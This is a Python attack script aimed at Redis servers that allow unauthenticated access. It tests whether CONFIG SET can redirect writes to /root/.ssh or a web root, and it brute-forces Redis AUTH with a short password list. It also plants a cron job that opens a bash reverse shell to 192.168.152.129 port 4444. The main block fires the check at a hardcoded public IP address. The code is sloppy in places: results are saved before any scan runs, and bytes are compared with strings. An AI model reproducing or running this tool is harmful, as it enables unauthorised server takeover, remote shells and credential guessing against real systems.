import socket
import sys


web_ip_set = set()
root_ip_set = set()
save_ip_set = set()
password_ip_set = set()


def check(ip, port, timeout):
    socket.setdefaulttimeout(timeout)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send('save\r\n'.encode('utf-8'))
    result = str(s.recv(1024))
    if 'OK' in result:
        print('It can save the file to the disk')
        s.send('config set dir /root/.ssh\r\n'.encode('utf-8'))
        result = str(s.recv(1024))
        if 'Permission denied' in result:
            print('Permission denied')
            save_ip_set.add(ip)
        elif 'OK' in result:
            print('It probably can write the ssh !!')
            root_ip_set.add(ip)
        else:
            print('It may be the windows os')
            save_ip_set.add(ip)
        s.send('config set dir /var/www/html\r\n'.encode('utf-8'))
        result = str(s.recv(1024))
        if 'OK' in result:
            print('/var/www/html may have the web app')
            web_ip_set.add(ip)
        else:
            print('/var/www/html dont have web app, your can scan the ports of it')
            save_ip_set.add(ip)
    elif "Authentication" in result:
        for pass_ in PASSWORD_DIC:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            s.send(("AUTH %s\r\n" % (pass_)).encode('utf-8'))
            result = s.recv(1024)
            if 'OK' in result:
                password_ip_set.add(ip)
                return "ip %s 存在弱口令，密码：%s" % (ip, pass_)
    else:
        print('Just give up this ip, it can not save the data')



def auto_attack(ip, port,timeout):
    socket.setdefaulttimeout(timeout)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    payload = ['set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.152.129/4444 0>&1\n\n"',
               'config set dir /var/spool/cron',
               'config set dbfilename root',
               'save']
    for i in payload:
        s.send(i.encode('utf-8'))
        result = s.recv(1024)
        print(result)



if __name__ == '__main__':
    import time
    PASSWORD_DIC = ['redis', 'root', 'oracle', 'password', 'p@aaw0rd', 'abc123!', '123456', 'admin']

    data = time.ctime() + '\n'
    for i in root_ip_set:
        data += '[Root] %s \n'% i
    for i in web_ip_set:
        data += '[Web] %s \n' % i
    for i in save_ip_set:
        data += '[Save] %s \n' % i
    for i in password_ip_set:
        data += '[Pass] %s \n' % i
    with open('Redis_unauth_access.txt', 'w+') as f:
        f.write(data)

    check('46.101.62.175', '6379', 30)




